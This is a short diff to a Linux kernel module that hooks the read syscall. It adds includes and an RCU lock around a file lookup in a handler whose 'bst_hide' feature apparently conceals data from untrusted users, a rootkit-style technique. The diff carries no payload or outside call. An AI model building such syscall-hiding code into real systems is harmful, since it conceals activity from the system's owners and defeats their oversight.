@@ -43,6 +43,7 @@
 #include <linux/mount.h>
 #include <linux/magic.h>
 #include <linux/mutex.h>
+#include <linux/rcupdate.h>
 #include <linux/version.h>
 #include <asm/unistd.h>
 
@@ -50,6 +51,7 @@
 #include "klog.h"
 #include "hook/syscall_hook.h"
 #include "infra/bst_hide.h"
+#include "infra/symbol_resolver.h"
 
 /* Syscall numbers, with the arch table values as fallbacks.  asm-generic
  * spells some of these through an intermediate __NR3264_* name, so the
@@ -571,7 +573,9 @@ static long bst_sys_read(const struct pt_regs *regs)
 	if (likely(!bst_hide_enabled) || likely(bst_uid_trusted()) || !ubuf || !count)
 		return bst_orig_read(regs);
 
+	rcu_read_lock();
 	file = fget(fd);
+	rcu_read_unlock();
 	if (!file)
 		return bst_orig_read(regs);
 
